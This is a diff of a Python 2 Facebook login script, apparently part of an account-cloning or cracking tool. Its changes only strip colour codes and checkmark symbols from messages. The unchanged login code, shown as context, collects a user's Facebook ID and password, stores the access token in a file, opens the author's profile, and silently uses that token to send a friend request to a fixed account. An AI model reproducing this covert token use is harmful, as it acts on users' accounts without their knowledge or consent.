@@ -67,7 +67,7 @@ logo = """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93m✔\x1b[1;93mLoading \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[1;93mLoading \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -119,8 +119,8 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;91mWarning: \033[1;93mDo Not Use Your Personal Account' )
-		jalan('          \033[1;93mUse a Fresh Account To Login' )
+		jalan(' \033[1;91mWarning: \033[1;97mDo Not Use Your Personal Account' )
+		jalan('          \033[1;97mUse a Fresh Account To Login' )
 		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
 		print('	   \033[1;96m【\x1b[1;96mLOGIN WITH FACEBOOK\x1b[1;96m】' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
@@ -151,7 +151,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;92m✔\x1b[1;92mLogin Successful'
+				print '\n\x1b[1;92mLogin Successful'
 				os.system('xdg-open https://www.Facebook.com/Omi6t')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
